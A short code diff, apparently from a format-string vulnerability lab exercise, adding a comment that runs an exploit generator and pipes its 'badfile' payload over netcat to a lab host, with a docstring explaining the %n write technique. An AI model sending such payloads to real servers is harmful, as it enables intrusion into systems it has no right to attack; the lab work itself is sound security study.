@@ -22,6 +22,8 @@ with open('badfile', 'wb') as f:
     f.write(content)
 
 """
+./task3A.py 64; cat badfile | nc 10.9.0.5 9090
+
 Symilar to task2B.py, we save the address of where we want to write in the first 4 cells
 than with %n we write the number of characters written so far into the address we saved in the first 4 cells
 """
